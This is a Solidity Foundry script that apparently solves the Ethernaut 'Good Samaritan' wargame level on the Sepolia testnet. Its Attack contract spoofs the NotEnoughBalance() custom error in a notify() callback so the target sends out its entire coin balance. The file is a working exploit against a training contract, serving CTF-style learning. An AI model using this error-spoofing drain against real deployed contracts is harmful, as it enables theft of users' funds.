// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {GoodSamaritan, Coin, Wallet} from "../src/GoodSamaritan.sol";

// $ source .env      # This is to store the environmental variables in the shell session
// $ forge script script/GoodSamaritan.s.sol --tc GoodSamaritanSolution --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv

contract GoodSamaritanSolution is Script {
    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    // this is the instance address created by the ethernaut contract
    address public instance = payable(vm.envAddress("GOODSAMARITAN_INSTANCE"));

    /* Attack idea:
        The idea is simply, we need to revert with a custom error NotEnoughBalance() to trigger the catch block in the requestDonation function
        this will make the contract to send all the remaining coins to the attacker
        We will create a contract that will revert with the NotEnoughBalance() error when it receives the coins
        notice that it will call the notify function if the dest_ address is a contract (our attack contract)
        Using the notify function we can trigger the revert with the NotEnoughBalance() custom error
        Notice that we need to make a condition when to fire the NotEnoughBalance() error, because when we receive all the coins we don't want to revert
    */

    function run() external {
        vm.startBroadcast(deployerPrivateKey);

        GoodSamaritan goodSamaritanInstance = GoodSamaritan(instance);
        Coin coinInstance = goodSamaritanInstance.coin();
        Wallet walletInstance = goodSamaritanInstance.wallet();

        // create an instance of the attack contract with the GoodSamaritan instance address
        Attack attackContract = new Attack(goodSamaritanInstance);

        // Initial balance of the attacker and the wallet
        console.log("Attacker balance: ", coinInstance.balances(address(attackContract)));
        console.log("Wallet balance: ", coinInstance.balances(address(walletInstance)));
        // call the attack function
        attackContract.attack();

        // Final balance of the attacker and the wallet
        console.log("Attacker balance: ", coinInstance.balances(address(attackContract)));
        console.log("Wallet balance: ", coinInstance.balances(address(walletInstance)));

        vm.stopBroadcast();
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}

contract Attack is INotifyable {
    error NotEnoughBalance();

    GoodSamaritan public goodSamaritanInstance;

    constructor(GoodSamaritan _instance) {
        goodSamaritanInstance = _instance;
    }

    function notify(uint256) external view override {
        Coin coinInstance = goodSamaritanInstance.coin();
        // check if the balance of the attacker is greater than 0
        if (coinInstance.balances(address(this)) == 10) {
            revert NotEnoughBalance();
        }
    }

    function attack() public {
        goodSamaritanInstance.requestDonation();
    }
}
